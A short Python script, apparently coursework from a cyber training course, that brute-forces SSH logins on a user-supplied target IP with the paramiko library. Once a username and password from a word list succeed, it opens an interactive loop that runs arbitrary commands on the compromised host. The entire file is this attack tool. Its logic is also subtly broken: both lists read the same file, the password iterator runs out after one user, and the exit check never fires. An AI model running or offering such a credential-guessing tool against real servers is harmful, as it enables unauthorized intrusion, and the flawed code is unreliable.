import paramiko

ssh= paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
target= input("Enter target IP: ")
port= 22

user= open(r"C:\FILES\Cyber\Phase3\Python\pass.txt")
passwd= open(r"C:\FILES\Cyber\Phase3\Python\pass.txt")
auth= False
cmd= " "

for u in user:
    u = u.replace("\n","")
    try:
        for password in passwd:
            password= password.replace("\n","")
            ssh.connect(hostname= target, username=u, password= password, timeout=2)
            print(f"Connected with {u} and {password}")
            while True:
                cmd = input("Enter command: ")
                if cmd.lower == "exit":
                    exit(0)
                else:
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    auth = True
                    print(f"The Data is: \n {stdout.read().decode()} \n\n Errors: \n {stderr.read().decode()}")

    except paramiko.ssh_exception.AuthenticationException as error:
        print("Trying...")
